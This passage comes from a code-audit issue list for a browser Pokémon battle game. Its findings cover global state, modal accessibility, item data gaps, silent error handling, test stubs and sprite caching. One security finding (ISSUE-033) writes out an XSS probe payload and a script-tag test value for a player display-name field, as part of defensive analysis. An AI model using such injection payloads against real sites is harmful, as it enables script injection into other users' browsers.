if (alternatives.length > 1) commaAlternativeFields++;  // ← counts array len > 1 as CSV
```

**Repro**: `for f in data/builds/gen*.json; do node -e "..."; done` confirms zero comma-separated `item`/`ability`/`nature` strings across all six files; the schema is uniformly array-based. The validator output `Build alternative format is inconsistent — moves use array literals, ability/item/nature use comma-separated strings (6925 occurrences)` is therefore misleading.

**Blast radius**: Anyone who reads the data-integrity report (including this auditor) gets a P2 inconsistency claim that doesn't exist. Wastes triage cycles. The validator also undercounts genuine CSV-encoded slots if any are added in the future, because the array path is taken first.

**Fix sketch**: In `expandCommaAlternatives`, only increment `commaAlternativeFields` when the input was a string containing a comma. Restructure so the CSV-vs-array classification is made on the raw input type, not on the flattened result length. The "alternatives expansion" pass for legality validation should remain unchanged.

**Verification**: Re-run `node scripts/debug/data-validator.mjs`; the P2 "inconsistent format" finding should disappear (or only fire if a real CSV is added).

---

## <a id="ISSUE-028"></a> ISSUE-028: 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable

---
id: ISSUE-028
severity: P2
category: refactor
anchor_symbol: global_state_coupling
current_line_hint: ~447
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 8a35ede06e36
confidence: high
status: open
---

**Title**: 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable

**Evidence**:
```js
// 18 distinct globals, cataloged from grep -nE 'global\.__\w+' online-pvp.js:
// __PBS_SUPABASE_URL (L22, L38)              // config
// __PBS_SUPABASE_ANON_KEY (L23, L38)         // config
// __onlineMatchTimerPreset (L99, L288, L403)
// __onlineMatchFormat (L103, L455, L753)
// __hostOnlineBattleStarted (L447) + __onlineHostDraftDeadlinePrimed (L451)
// __guestLastResolved (L448) + __guestBattleStartApplied (L449)
// __onlineGuestJoined (L450) + __onlineGuestRematchApplied (L456)
// __onlineP1Wins / __onlineP2Wins / __onlineRoundNumber (L452-454, L650-652, L750-752)
// __onlineHostName / __onlineGuestName (L457-458, L748-749, L791-792)
// __onlineBattleDeadlineFiring (L671, L679, L699)
// __runLockedPvPTurnResolution (L604-605)
// __onlinePvpConfigured (L818) // export
```

**Repro**: `grep -nE 'global\.__\w+' online-pvp.js | wc -l` → 36. Then `grep -nE '__online' battle.html | wc -l` for the consumer side (likely >50). Every global is a synchronization channel between the PvP module and the main battle code; there's no schema, no `defineProperty` reactivity, no central reset. The `dispose` method at L446-460 enumerates the resets manually — every new global added to the module must remember to wire into dispose's `catch(e){}` block, or stale state leaks across rooms.

**Blast radius**: Maintenance & correctness. Real symptoms: a new `__onlineFoo` flag added without a `dispose` reset leaves the second match in the same browser session in a half-stuck state. The `try { ... } catch (e) {}` at L460 even silences the AssertionError if you typo a global name during a reset.

**Fix sketch**: Wrap all PvP-related cross-module state in a single `global.OnlineBattle.session = { hostName: null, guestName: null, p1Wins: 0, ... }` object. Provide a `resetSession()` method that the host calls on `dispose` and on each rematch. Consumers in `battle.html` read `OnlineBattle.session.hostName` instead of `__onlineHostName`. Migration is mechanical (sed/codemod). Optional: make the object a Proxy that logs writes in `__DEBUG_PVP=true` mode to catch which global is mutating when.

**Verification**: After refactor, `grep -nE 'global\.__online\w+|global\.__host\w+|global\.__guest\w+' online-pvp.js | wc -l` should drop to 0 (or only the config keys). dispose's manual reset block goes away in favor of `this.session = freshSession()`.

---

## <a id="ISSUE-029"></a> ISSUE-029: 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby

---
id: ISSUE-029
severity: P2
category: a11y
anchor_symbol: modal-dialog-roles
current_line_hint: ~7519
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a8ccc1946cb8
confidence: high
status: open
---

**Title**: 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby

**Evidence**:
```
$ grep -nE 'role="dialog"' battle.html
7683:    <div id="modal-help" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="help-title">
7760:    <div id="modal-summary" class="modal hidden" role="dialog" aria-labelledby="sum-header-name" aria-modal="true">

$ grep -nE 'class="modal' battle.html | wc -l
12
```

Only `modal-help` and `modal-summary` declare themselves as dialogs. The remaining ten — `modal-settings`, `modal-story-run-summary`, `modal-story-abandon-confirm`, `modal-game-alert`, `modal-game-confirm`, `modal-online-host`, `modal-gauntlet-leaderboard`, `modal-online-pvp` (+ two more) — render as plain `<div class="modal">`. They function as modal dialogs (background blocks pointer events; titles like "Abandon this run?", "Host online battle"), so SR users get no context when they pop. `modal-game-alert` and `modal-game-confirm` are the in-page replacements for native `alert()`/`confirm()` (per the comment at line 7619) — these specifically must be dialogs.

**Repro**: Click ⚙ settings; open Story → Abandon Run; open Online → Host. SR announces "button" instead of "dialog, Settings / Abandon this run? / Host online battle".

**Blast radius**: Settings is the highest-frequency entry point. Abandon-Run is destructive. Both being unannounced is a real safety concern.

**Fix sketch**: Add `role="dialog" aria-modal="true"` to each `<div class="modal">`. Ensure the `<h2>` inside each has an `id`, and reference it via `aria-labelledby`. Centralise via `class="modal"` selector + a tiny `connectedCallback`-style init in JS so future modals inherit it.

**Verification**: `grep -cE 'class="modal[^"]*" *[^>]*role="dialog"' battle.html` returns 12.

---

## <a id="ISSUE-030"></a> ISSUE-030: Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users

---
id: ISSUE-030
severity: P2
category: a11y
anchor_symbol: modal-escape-key
current_line_hint: ~16555
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 44450b67ba55
confidence: high
status: open
---

**Title**: Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users

**Evidence**:
```
$ grep -nE "e.key === 'Escape'" battle.html
13021: moveOpen — closes move tooltip
16555: closes #modal-summary only
27015: closes a casino sheet (b / B / Escape)
29833: closes a one-off overlay
```

`closeModal('modal-X')` is wired up to a close button or click-on-backdrop on each modal, but the document-level Escape handler exists only for `modal-summary` (party summary). Keyboard-only players cannot dismiss `modal-settings`, `modal-game-alert`, `modal-game-confirm`, `modal-online-host`, `modal-online-pvp`, `modal-story-abandon-confirm`, `modal-story-run-summary`, or `modal-gauntlet-leaderboard` without hunting for the close button by Tab. `modal-game-alert` in particular blocks the entire game and is the in-page replacement for native `alert()` — native alerts close on Esc.

**Repro**: Open ⚙ Settings via keyboard, press Esc → nothing happens. Open Abandon Run, press Esc → nothing. Native-alert convention violated.

**Blast radius**: Every modal except summary. Pairs with the dialog-role finding (a11y users need both role + Esc).

**Fix sketch**: Generalise the `modal-summary` Escape handler into a single document-level `keydown` listener that finds the topmost non-hidden `.modal:not(.hidden)` and calls `closeModal(modal.id)`. Make sure `modal-game-confirm`'s Cancel path is invoked on Esc (since closing == cancelling).

**Verification**: Open each modal, press Esc → closes. `closeModal` runs.

---

## <a id="ISSUE-031"></a> ISSUE-031: 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json`

---
id: ISSUE-031
severity: P2
category: data
anchor_symbol: POKEMART_ITEMS
current_line_hint: ~28876
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 8d497740c197
confidence: medium
status: open
---

**Title**: 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json`

**Evidence**:
```js
// battle.html POKEMART_ITEMS + DEPT_ITEMS (verified ids):
// pokeBall    -> items.json: present (pokeball)
// greatBall   -> items.json: present (greatball)
// potion, superPotion, hyperPotion, maxPotion, fullRestore, fullHeal,
// ether, elixir, maxElixir, xAttack, xDefense, xSpAtk, xSpDef, xSpeed,
// xAccuracy, direHit, guardSpec, revivalHerb, revive, maxRevive,
// sunOrb, rainOrb, hailOrb, sandOrb, electricOrb, grassyOrb,
// psychicOrb, mistyOrb, emergencyTeleporter -> ALL MISSING from items.json
```

**Repro**: `node -e` lookup against `data/items.json` flattened keys for each mart id reports MISSING for everything except `pokeBall` and `greatBall`. See `battle.html:28876-28910`.

**Blast radius**: The mart catalog is self-contained (each row has `id`, `name`, `desc`, `effect`), so the shop works fine without items.json. The only consumer that reaches into items.json is the tooltip dictionary in `loadGameData` (sets `tooltipDict[it.name] = it.shortDesc`); mart items use their own `desc` field, so this works too. However, any future feature that uniformly walks `items.json` to render bag UI, drop tables, or inventory analytics will see a phantom-item population — bag items and held items live in two disjoint universes.

**Fix sketch**: Either (a) add the 29 missing entries to `data/items.json` so the catalog is the single source of truth for item metadata; or (b) document explicitly in a `data/README.md` (or schema note) that `items.json` covers only held-items / berries and that bag/shop consumables live exclusively in `POKEMART_ITEMS` and `DEPT_ITEMS`. Option (b) is much cheaper and matches the historical architecture.

**Verification**: If option (a), the mart-coverage check (added to `scripts/debug/data-validator.mjs`) should pass. If option (b), the README addition is the deliverable; no code change.

---

## <a id="ISSUE-032"></a> ISSUE-032: 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging

---
id: ISSUE-032
severity: P2
category: dx
anchor_symbol: setBattleLogHtml
current_line_hint: ~230
file: online-pvp.js
agents: [consistency-auditor]
fingerprint: e261b55d36c1
confidence: medium
status: open
---

**Title**: 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging

**Evidence**:
```js
// L230  } catch (e) {}                                          (setBattleLogHtml DOM access)
// L417  try { sb.removeChannel(channel); } catch (e) {}         (_subscribe)
// L435  try { sb.removeChannel(channel); } catch (e) {}         (dispose)
// L460  } catch (e) {}                                          (reset state vars)
// L553  try { global.syncBattleActiveHighlight(); } catch (e) {}
// L760  try { global.AudioSystem.startNewBattle(); } catch (e) {}
// L775/L797 — same shape
```

**Repro**: A subscription failure, DOM-detached state, or missing global helper silently no-ops. Debug becomes "look at all eight catches manually".

**Blast radius**: Diagnostic blind spots only — no runtime bug, but a real "what just happened?" cost when investigating PvP issues in the field.

**Fix sketch**: Replace each `catch (e) {}` with `catch (e) { console.debug('[OnlinePvP] <site> swallowed', e); }`. Some sites can stay silent (the `sb.removeChannel` cleanup is genuinely best-effort) — document those with `/* best-effort */` instead of empty.

**Verification**: After a known-failure scenario (e.g., disconnect mid-battle), check the console for diagnostic breadcrumbs.

---

## <a id="ISSUE-033"></a> ISSUE-033: Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS

---
id: ISSUE-033
severity: P2
category: security
anchor_symbol: setDisplayName
current_line_hint: ~812
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 89314480e594
confidence: medium
status: open
---

**Title**: Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS

**Evidence**:
```js
// online-pvp.js L812-814
setDisplayName(n) {
    global.localStorage.setItem(STORAGE_KEY, String(n || '').trim().slice(0, 24) || 'Trainer');
}
// L723 host pushes the unsanitized name back to room data:
host_display_name: nPrev.host_display_name || (global.localStorage && global.localStorage.getItem('pbs_online_display_name')) || 'Host',
// battle.html L14695-14696 — guest stores remote name on globals
if (d.host_display_name) window.__onlineHostName = d.host_display_name;
if (d.guest_display_name) window.__onlineGuestName = d.guest_display_name;
// battle.html L16285-16286, L791-794 — currently safe (innerText), but each new call site is a foot-gun
if (title.includes('VICTORY')) document.getElementById('end-desc').innerText = `${p1n} won this round!`;
```

**Repro**: Set localStorage `pbs_online_display_name = '<img src=x onerror=alert(1)>'.slice(0, 24)` → `'<img src=x onerror=ale'` (truncated but the `<img` still parses). Currently only `innerText` consumers exist, so the live attack surface is zero. But there are 6+ globals (`__onlineHostName`, `__onlineGuestName`, etc.) holding raw player-controlled strings, and any future panel that does `el.innerHTML = ${name} won!` opens the door.

**Blast radius**: Latent — depends on future innerHTML callsites touching display names. Compounded by the open-RLS finding above: an attacker doesn't even need to log in; they can directly write `host_display_name` to any live room via the open UPDATE policy.

**Fix sketch**: In `setDisplayName`, strip HTML-sensitive chars: `String(n || '').trim().replace(/[<>"'&]/g, '').slice(0, 24) || 'Trainer'`. Reject control characters too. Belt-and-suspenders: every consumer should use textContent/innerText only. Add an ESLint rule (or a grep test in CI) that fails if a line both touches `__onlineHostName`/`__onlineGuestName` and contains `innerHTML`.

**Verification**: Set the localStorage key to `'<script>x</script>'`, start a match, eyeball the score panel — it should display the literal characters (or empty), not execute.

---

## <a id="ISSUE-034"></a> ISSUE-034: Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored

---
id: ISSUE-034
severity: P2
category: a11y
anchor_symbol: showVictoryOverlay
current_line_hint: ~38410
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 7196d6421a81
confidence: high
status: open
---

**Title**: Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored

**Evidence**:
```js
// showVictoryOverlay at ~38410
const ov = document.createElement('div');
ov.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:9999;…';
const contBtn = document.createElement('button');
contBtn.textContent = 'Continue →';
…
const autoClose = setTimeout(dismiss, 6000);
contBtn.onclick = (e) => { e.stopPropagation(); dismiss(); };
…
ov.onclick = () => dismiss();
document.body.appendChild(ov);
```

The post-battle victory overlay is the highest-pomp moment of the run (badges, gold, mystery reveals, "First time ever" banner). It's a fullscreen layer with no `role="dialog"`, no `aria-modal`, no `aria-labelledby` on "VICTORY!", no `Escape`/`Enter` to dismiss before the 6 s autoclose, no focus on `Continue →`. SR users hear nothing announce. Sighted keyboard users can't dismiss early without finding the button with Tab.

**Repro**: Win any story battle → overlay opens. Hit Esc/Enter → nothing. Hit Tab → focus may or may not land on Continue (depends on prior focus).

**Blast radius**: Every story victory, every gym clear, every Elite/Champion celebration. Combined with the tutorial dialog gap (sibling finding), the highest-emotion story beats are also the least accessible.

**Fix sketch**: Same pattern as tutorial: `role="dialog"`, `aria-modal="true"`, label by the VICTORY heading, autofocus `contBtn` next frame, add Esc/Enter keydown that calls `dismiss()`. Keep the auto-close.

**Verification**: Esc after victory closes the overlay; SR announces "VICTORY!, dialog" on open.

---

## <a id="ISSUE-035"></a> ISSUE-035: 351 it.todo() stubs across 3 move-category test files — cluster enumeration

---
id: ISSUE-035
severity: P2
category: test-gap
anchor_symbol: tests/moves/by-category
current_line_hint: ~30
file: tests/moves/by-category/status.test.js
agents: [test-coverage-filler]
fingerprint: fca6be0da22a
confidence: high
status: open
---

**Title**: 351 it.todo() stubs across 3 move-category test files — cluster enumeration

**Evidence**:

```
File counts (confirmed via grep -nE "^\s*it\.todo\("):
  tests/moves/by-category/status.test.js   = 210 TODOs
  tests/moves/by-category/special.test.js  =  74 TODOs
  tests/moves/by-category/physical.test.js =  67 TODOs
  TOTAL                                    = 351 TODOs

Cluster taxonomy (42 buckets; setup-shape, not move-category):

| cluster id | count | example moves (first 3) |
|---|---|---|
| noop-flavor | 2 | Celebrate, Splash |
| boost-self | 1 | Howl |
| self-boost | 1 | Clanging Scales |
| boost-target | 10 | Aromatic Mist, Captivate, Coaching |
| pure-status-target | 14 | Dark Void, Glare, Grass Whistle |
| pure-volatile-self | 16 | Aqua Ring, Destiny Bond, Focus Energy |
| pure-volatile-foe | 26 | Attract, Confuse Ray, Curse |
| heal | 23 | Floral Healing, Heal Order, Heal Pulse |
| field-side-condition | 15 | Aurora Veil, Crafty Shield, Light Screen |
| field-terrain | 4 | Electric Terrain, Grassy Terrain, Misty Terrain |
| weather-set | 6 | Chilly Reception, Hail, Rain Dance |
| field-pseudo-weather | 8 | Fairy Lock, Gravity, Ion Deluge |
| field-clear | 4 | Court Change, Defog, Haze |
| secondary-status | 13 | Blizzard, Discharge, Heat Wave |
| secondary-boost | 12 | Acid, Bleakwind Storm, Bubble |
| secondary-volatile | 7 | Fiery Wrath, Snore, Sparkling Aria |
| damage-plain | 14 | Burn Up, Doom Desire, Future Sight |
| drain | 2 | Matcha Gotcha, Parabolic Charge |
| fixed-damage | 5 | Dragon Rage, Night Shade, Psywave |
| fractional-hp-damage | 4 | Natures Madness, Ruination, Endeavor |
| variable-power | 22 | Electro Ball, Grass Knot, Pika Papow |
| signature-ohko | 4 | Sheer Cold, Fissure, Guillotine |
| protect-like | 11 | Baneful Bunker, Burning Bulwark, Detect |
| counter-like | 4 | Mirror Coat, Comeuppance, Counter |
| lock-on | 2 | Lock-On, Mind Reader |
| self-effect-special | 4 | Belly Drum, Refresh, Stuff Cheeks |
| pp-reduction | 1 | Spite |
| status-transfer | 1 | Psycho Shift |
| boost-copy-flip | 4 | Flower Shield, Psych Up, Rototiller |
| stat-swap-split | 7 | Guard Split, Guard Swap, Heart Swap |
| ability-manipulation | 6 | Doodle, Entrainment, Role Play |
| type-change | 8 | Camouflage, Conversion, Conversion 2 |
| force-switch-or-trap | 5 | Block, Mean Look, Roar |
| item-manipulation | 4 | Bestow, Recycle, Switcheroo |
| perish-song | 1 | Perish Song |
| final-gambit | 1 | Final Gambit |
| turn-order-helper | 4 | After You, Ally Switch, Quash |
| pivot-or-faint-helper | 3 | Baton Pass, Parting Shot, Teleport |
| meta-move | 10 | Assist, Copycat, Instruct |
| misc-truly-unclassified | 1 | Transform |
| charge | 17 | Electro Shot, Ice Burn, Meteor Beam |
| ally-or-spread-target | 44 | Air Cutter, Astral Barrage, Boomburst |
| SUM | 351 | (reconciled against grep count) |
```

```
NOTE: zero TODOs needed multihit/recoil bucketing — the auto-generator
already filled those. The TODO surface is dominated by:
  - Utility/status moves (volatile + side-condition + heal):  ~115
  - Spread/ally-target damage (skipped in singles harness):    44
  - Variable-power + condition-dependent damage:               36
  - Signature/transform/meta moves:                            ~50
  - Charge moves needing 2-turn runs:                          17
```

**Repro**: `/fix-todo-test <cluster-id>` per cluster (e.g. `/fix-todo-test pure-status-target`). Each invocation should write to `tests/moves/by-category/_drafts/<cluster-id>.test.js`.

**Blast radius**: tests/moves/by-category/* (do not edit existing files; orchestrator promotes drafts after review). The harness file `tests/helpers/load-engine.js` is consumed by every cluster; if it cannot satisfy doubles/spread targets, the `ally-or-spread-target` cluster (44 moves) should be deferred or skipped.

**Fix sketch**: Execute clusters in cheapest-setup order. Recommended order (cheapest to most expensive):

1. `noop-flavor` (2) — no precondition, assert no state change
2. `boost-self` (1), `boost-target` (10) — single-turn, assert stage delta
3. `pure-status-target` (14) — assert `defender.status === 'slp'|'par'|...`
4. `pure-volatile-self` (16), `pure-volatile-foe` (26) — assert volatile applied to user/foe
5. `heal` (23) — pre-damage user, assert HP restored
6. `weather-set` (6), `field-terrain` (4), `field-side-condition` (15), `field-pseudo-weather` (8), `field-clear` (4) — assert field/side state
7. `secondary-status` (13), `secondary-boost` (12), `secondary-volatile` (7) — assert damage dealt; secondary chance assertions should tolerate RNG (run many trials or pin seed)
8. `damage-plain` (14), `drain` (2), `fixed-damage` (5), `fractional-hp-damage` (4), `signature-ohko` (4) — assert HP threshold
9. `variable-power` (22) — set up scaling variable (HP%, weight, level, friendship, status), assert damage scales
10. `protect-like` (11), `counter-like` (4), `lock-on` (2), `self-effect-special` (4), `pp-reduction` (1), `status-transfer` (1) — two-turn setups
11. `boost-copy-flip` (4), `stat-swap-split` (7), `ability-manipulation` (6), `type-change` (8) — two-pokemon state changes
12. `force-switch-or-trap` (5), `item-manipulation` (4), `perish-song` (1), `final-gambit` (1), `turn-order-helper` (4), `pivot-or-faint-helper` (3), `meta-move` (10), `misc-truly-unclassified` (1) — special-case scaffolding (likely partial coverage)
13. `charge` (17) — two-turn runTurn, assert damage on turn 2
14. `ally-or-spread-target` (44) — **LAST**: singles harness almost certainly cannot drive these; expect to mark `it.skip()` or document as deferred

Batch limit per invocation: 25–40 TODOs. Split larger buckets (`ally-or-spread-target` 44 → 2 batches; `pure-volatile-foe` 26 fits in one; `heal` 23 fits in one; `variable-power` 22 fits in one).

**Verification**: Each `/fix-todo-test <cluster-id>` invocation writes `tests/moves/by-category/_drafts/<cluster-id>.test.js` and runs `node --test` on it. The agent emits a follow-up finding noting per-cluster status (passing / partially-failing / bug-discovered). Final reconciliation: `grep -c "it.todo" tests/moves/by-category/*.test.js` should approach zero after all drafts are promoted by the orchestrator.

---

## <a id="ISSUE-036"></a> ISSUE-036: 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool

---
id: ISSUE-036
severity: P2
category: inconsistency
anchor_symbol: TRAINER_QUOTES_BY_NAME
current_line_hint: ~29450
file: battle.html
agents: [consistency-auditor]
fingerprint: cbadf67900dd
confidence: high
status: open
---

**Title**: 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool

**Evidence**:
```js
// TRAINER_QUOTES_BY_NAME has named intros for Brock/Misty/Lt.Surge/Erika/Koga/Sabrina/Blaine/Giovanni
// only — every other Gym Leader defined in TRAINER_DATA falls back to TRAINER_QUOTES['Gym Leader'].
// Missing: Allister, Bea, Brassius, Brawly, Brycen, Bugsy, Burgh, Byron, Candice, Chuck,
//   Cilan, Clair, Clay, Clemont, Crasher Wake, Drayden, Elesa, Falkner, Fantina, Flannery,
//   Gardenia, Gordie, Grant, Grusha, Iono, Jasmine, Kabu, Katy, Kofu, Korrina, Lenora,
//   Maylene, Melony, Milo, Morty, Nessa, Norman, Olympia, Opal, Piers, Pryce, Raihan,
//   Ramos, Roark, Roxanne, Ryme, Skyla, Tate, Tulip, Valerie, Viola, Volkner, Wattson,
//   Whitney, Winona, Wulfric (56 leaders)
// These all have LEADER_VICTORY_LINES (post-battle) and LEADER_BADGE_REFLECTIONS, but
// no pre-battle voice — they're just "Show me what you've trained for."
```

**Repro**: Story run, reach Falkner / Roark / Wattson / Raihan as your gym leader (any non-Kanto first-gen leader). Compare the intro line — it'll be the same generic 6-line pool for every one of them.

**Blast radius**: Cosmetic — the moment-to-moment "fanservice" of a recognisable gym leader is missed. Battle still functions. Same problem the prior audit flagged for Champion victory; the gym intro layer was never extended the same way.

**Fix sketch**: Add 2-3 lines per missing leader to `TRAINER_QUOTES_BY_NAME`, matching the existing tone (one-liner Game Boy-style boasts). The 8 Kanto leaders are the template. ~150 lines of text data.

**Verification**: Manual — start a story run, fight each of the 8 cities' gym leader, eyeball that the intro line reflects the trainer's personality (e.g. Raihan = social media banter, Allister = quiet ghost flavor).

---

## <a id="ISSUE-037"></a> ISSUE-037: Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing

---
id: ISSUE-037
severity: P2
category: a11y
anchor_symbol: type-badge
current_line_hint: ~14906
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 2c0ca902ef08
confidence: high
status: open
---

**Title**: Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing

**Evidence**:
```js
// getTypeHTML at ~14906
let html = `<span class="type-badge type-${t1}" onmousemove="window.showTypeTooltip('${t1}', event)" onmouseleave="window.hideTextTooltip()" style="cursor:help;">${t1}</span>`;

// Battle-log move link at ~12958
return `used <span class="log-move-link tip-move-cell" data-mn="${enc}" onclick="…showMoveTooltipTap(…)" onmousemove="…showMoveTooltip(…)" onmouseleave="…">${moveName}</span>!`;
```

The defensive/offensive type chart, raw move stats (BP/Acc/PP/effect), and inline tip-term glossary are *only* surfaced via tooltip. The triggers are `onmousemove` + `onclick` — there is no `onfocus`/`onblur` pair, so keyboard users tabbing through battle log spans get no tooltip even if the element is focusable. Touch users hit the `onclick` "tap mode" branch (good) but only on terms that have an `onclick` handler; many decorative type badges (`getTypeHTML` above) lack one entirely.

**Repro**: Tab to a "burned" / "leech-seeded" status word in the battle log → nothing. Press Enter on a type badge in the foe's stat box → nothing.

**Blast radius**: Type chart is critical learning content. Hover-only delivery makes it inaccessible to keyboard, touch on decorative badges, and many SR users.

**Fix sketch**: For each tooltip helper, mirror `onmousemove` with `onfocus` (using the same handler) and `onmouseleave` with `onblur`. Add `tabindex="0"` + `role="button"` to type badges and tip-term spans that don't already have them. The existing `showFieldTooltipFromData` at line 16034 already uses both `onclick` and `onkeydown` — replicate that pattern globally.

**Verification**: Tab to a type badge → tooltip shows on focus; type chart announces via SR.

---

## <a id="ISSUE-038"></a> ISSUE-038: `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads

---
id: ISSUE-038
severity: P3
category: inconsistency
anchor_symbol: _pickCityQuoteLine
current_line_hint: ~29705
file: battle.html
agents: [consistency-auditor]
fingerprint: 2cc1751d63f6
confidence: medium
status: open
---

**Title**: `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads

**Evidence**:
```js
// L29673-L29706
// City NPC flavor (index = City N from event name). Uses Math.random only — must not advance story battle RNG.
const CITY_PROFESSOR_QUOTES = [ ... ];
const CITY_GUIDE_QUOTES = [ ... ];
function _pickCityQuoteLine(poolArr, cityIdx) {
    const idx = Math.min(Math.max(0, cityIdx|0), poolArr.length - 1);
    const lines = poolArr[idx] || poolArr[0];
    return lines[Math.floor(Math.random() * lines.length)];  // BARE — intentional
}
```

**Repro**: Save in City 4, reload — the professor quote may change between loads. Stated in the file comment as intentional ("must not advance story battle RNG").

**Blast radius**: Intentional behavior, low-impact. Could be made deterministic per (seed, cityIdx, visit-count) without touching the main story RNG stream by mirroring the `_storySideRng` pattern already used for rival secondary intros (L29622-29633). Would make seeded replays even more reproducible.

**Fix sketch**: Replace the bare `Math.random()` with `_storySideRng(cityIdx, sm.eventIndex|0)` so the same city visit at the same point produces the same quote. Keep the existing behavior off the main story RNG stream.

**Verification**: Reload a save twice at the same city event — professor/guide quote should be identical both times.

---

## <a id="ISSUE-039"></a> ISSUE-039: Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images

---
id: ISSUE-039
severity: P3
category: perf
anchor_symbol: _preloadedImages
current_line_hint: 11983
file: battle.html
agents: [performance-profiler]
fingerprint: 2b9d-imageprefetch
confidence: medium
status: open
---

**Title**: Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images

**Evidence**:
```js
// battle.html:11982
const _spriteCache = {};
const _preloadedImages = {};
// :12036
if (!_preloadedImages[url]) {
    let img = new Image(); img.src = url; _preloadedImages[url] = img;
}
```
`getSprite()` is called from 44 sites (every battle-UI redraw, every party-screen render, every draft-card render, every PC storage render). Each unique (name, shiny, back) tuple creates an `Image` that holds the GIF in memory. A full story run sees 100–300 unique mons across battles, party screens, PC storage, and trainer previews. Multiply by `shiny` × `back` variants and the cache can easily exceed 500 entries; on a long save (multiple runs) it grows unboundedly.

**Repro**: Greps `grep -c 'new Image()' battle.html` → 1 (the only caller) and `grep -c 'getSprite\s*('` → 44 (the call sites). No eviction logic exists (`grep '_preloadedImages\s*='` shows only the initial `{}` declaration plus the assignment-in-loop).

**Blast radius**: Each GIF sprite from Showdown is ~5–50 KB. 500 cached = ~10–25 MB of image data the browser pins. On low-RAM mobile devices this contributes to mid-session crashes / OOM. The memory-growth benchmark at 60 turns shows only +5 MB heap growth (linear, R² = 0.712), but that's the JS heap — the image cache lives in the browser's image-decoder pool, separate from V8 heap, and would not show up in `process.memoryUsage()`. This finding is a forward-looking risk, not a confirmed regression. Marked P3 / confidence medium.

**Fix sketch**: Convert `_preloadedImages` from an unbounded Object into a bounded LRU cache (e.g., keep last 100 sprites). Alternatively, just remove the `new Image()` preload — modern browsers cache `<img src>` automatically once an `<img>` element is appended; the explicit Image() instances duplicate the cache.

**Verification**: After the fix, `Object.keys(_preloadedImages).length` should plateau in a long story run instead of growing monotonically.

---

## <a id="ISSUE-040"></a> ISSUE-040: `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented

---
id: ISSUE-040
severity: P3
category: refactor
anchor_symbol: createRoom_23505
current_line_hint: ~349
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 28d225daff16_2
confidence: low
status: open
---

**Title**: `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented

**Evidence**:
```js
// online-pvp.js L341-351
for (let attempt = 0; attempt < 8; attempt++) {
    roomCode = randomCode();
    const ins = await sb.from('pvp_rooms').insert({ code: roomCode, data }).select('id').single();
    if (!ins.error) { row = ins.data; break; }
    lastErr = ins.error;
    const dup = ins.error && (ins.error.code === '23505' || String(ins.error.message || '').toLowerCase().includes('duplicate'));
    //                                          ^^^^^^^ Postgres SQLSTATE for "unique_violation"
    if (!dup) throw ins.error;
}
```

**Repro**: Cosmetic. The fallback `.includes('duplicate')` covers the case where Supabase's error mapping changes (`error.code` becoming `'PGRST116'` or similar). Brittle to copy-paste into other tables (e.g., the gauntlet_leaderboard insert pattern in migration 002).

**Blast radius**: One site. No active bug.

**Fix sketch**: Add a constant `const PG_UNIQUE_VIOLATION = '23505';` at the top of the module with a one-line comment linking the Postgres docs. Or factor a helper `function isUniqueViolation(err)` so future callers (gauntlet leaderboard insert, etc.) share the same check.

**Verification**: Mechanical.

---

## <a id="ISSUE-041"></a> ISSUE-041: `isPokeball` flag set on 28 items but never read by the engine — dead metadata

---
id: ISSUE-041
severity: P3
category: data
anchor_symbol: isPokeball
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: 92eb6f313f92
confidence: high
status: open
---

**Title**: `isPokeball` flag set on 28 items but never read by the engine — dead metadata

**Evidence**:
```bash
$ grep -n "isPokeball\|isPokeBall" battle.html
# (no matches)
$ grep -c "isPokeball" data/items.json
28
```

**Repro**: `grep -nE "isPokeball|isPokeBall" /home/user/battle/battle.html` returns no lines (note: the mandate's spelling is `isPokeBall` with uppercase B, but the actual data uses `isPokeball`). The engine's ball-handling code uses its own `ballKey: 'master' | 'great' | ...` taxonomy in `POKEMART_ITEMS` rows, not the data-file flag.

